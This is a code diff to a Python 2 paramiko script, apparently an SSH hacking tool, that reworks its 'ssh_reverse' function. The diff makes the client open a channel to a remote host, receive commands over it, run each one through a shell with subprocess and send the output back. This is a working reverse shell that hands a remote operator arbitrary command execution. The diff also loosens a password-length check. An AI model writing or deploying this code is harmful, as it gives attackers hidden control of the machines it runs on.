@@ -8,6 +8,7 @@ import paramiko
 import sys
 import getopt
 import os
+import subprocess
 
 command = False
 download = False
@@ -66,12 +67,20 @@ def ssh_download(client):
 
 def ssh_reverse(client):
     transport=client.get_transport()
-    chan=transport.accept(1000)
+    chan=transport.open_session()
+    chan.send('hello')
+    command=chan.recv(1024)
     while True:
         try:
             command=chan.recv(1024)
-            print 'execute command: %s'% command
-            cmd_output= subprocess.check_output(command,shell=True)
+            if command == 'exit':
+                print '[EXIT] session finished '
+                chan.close()
+                client.close()
+                sys.exit(0)
+
+            print '[+] execute command: %s'% command
+            cmd_output= subprocess.check_output(command,shell=True)  
             chan.send(cmd_output)
         except:
             chan.close()
@@ -87,8 +96,8 @@ def ssh_client(target,user,passwd):
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         #如果提供帐号密码
-        if len(user)>2 and len(passwd)>6:
-            client.connect(ip,username=user,password=passwd)
+        if len(user)>2 and len(passwd)>2:
+            client.connect(target,username=user,password=passwd)
         else:
             #密钥连接
             client.connect(target)
